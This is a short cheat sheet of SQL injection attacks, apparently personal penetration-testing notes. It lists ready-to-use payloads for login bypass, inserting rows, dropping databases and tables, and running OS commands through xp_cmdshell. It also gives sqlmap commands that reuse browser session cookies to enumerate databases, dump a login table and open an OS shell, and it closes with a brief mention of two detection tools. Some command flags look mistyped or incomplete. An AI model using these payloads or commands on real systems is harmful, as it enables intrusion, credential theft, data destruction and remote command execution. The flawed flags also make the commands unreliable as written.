# SQL Injection

### Basic Commands

> batman' or 1=1 --

> batman'; insert into login values ('bat', 'man'); --

> batman'; create database batman; --

> batman'; drop database batman; -- 

> batman'; drop table batwomen; --

> batman'; exec master..xp_cmdshell 'ping google.com -l 50 -t'; --

### SQL Map
- Cookies can be fetcheed via Inspect Element --> Console --> document.cookie
- Copy the cookies
- Run SQL Map and type the following command

```
sqlmap -u <url> --cookies <cookies> --dbs
```

- Once the Database are found, fetch the tables.

```
sqlmap -u <url> --cookies <cookies> -D batman --tables
```

- Dumping the data from tables
```
sqlmap -u <url> --cookies -D batman -T login --dump
```

### Getting OS Shell
OS shell gives you an interactive shell to work with the DB and OS.

```
sqlmap -u <url> --cookies --os-shell
```

# Detecting SQL Injection

### 1. DSSS

```
python3 dsss.py -u <url> --cookies <cookies>
```

#### 2. OWASP ZAP

```
OWASP ZAP Automated Scanner - Active Scanner
```